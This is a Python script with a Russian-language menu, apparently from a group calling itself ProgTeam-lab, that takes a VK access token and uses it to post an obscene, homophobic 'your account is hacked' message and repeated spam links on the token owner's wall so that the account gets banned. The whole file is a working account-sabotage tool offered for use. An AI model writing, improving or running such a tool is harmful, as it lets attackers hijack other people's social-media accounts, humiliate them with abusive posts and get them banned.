import requests
import vk_api
import os
import time
from colorama import Fore, Back, Style 
def ban():
    os.system("clear")
    intro = '''
\033[32m\033[01m

▒▐▌▒▐▌▒▐█▒▐▀░▐█▀▄─░░▄█▀▄─▒██▄░▒█▌
░▒█▒█░▒▐██▌░░▐█▀▀▄░▐█▄▄▐█▒▐█▒█▒█░
░▒▀▄▀░▒▐█▒▐▄░▐█▄▄▀░▐█─░▐█▒██░▒██▌
\033[0m
      .:ProgTeam-lab:. .:|vk.com/progteamlub|:.

'''
    print(Fore.RED + "\033[1m" + intro)
    print(Fore.WHITE + """                                  
[1] За банить                        
[2] Владелец                          
[3] EXIT                                 


    """)
    a = input("[Введи] -> ")
    if a == "1":
        try:
            tok = input("[Введи 'ТоКеН'] -> ") 
            token = vk_api.VkApi(token = tok) 
            vk = token.get_api()
            vk.wall.post(message='Твоя жопа взломана! Ответственность взял ПеДиК По ИмЕнИ "ТЫ')
            for var in range(5):
                time.sleep(3)
                vk.wall.post(message='vto.pe ')             
                print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
            print(Back.BLACK + Fore.WHITE)
            os.system("clear")
            ban()
        except Exception as er:
            print('Невалидный токен или страница в бане')
            ban()
    if a == "2":
        print("""                                  
 Владельцы                           
 VK: https://vk.com/club197630524                    
 VK: https://vk.com/club190719914                 
 Для выхода в главное меню нажмите Enter   

        """)
        c = input("-> : ")
        if c == "1":
            os.system("clear")
            ban()
        else:
            os.system("clear")
            ban()
    if a == "3":
        os.system("exit")
    else:
        ban()
ban()
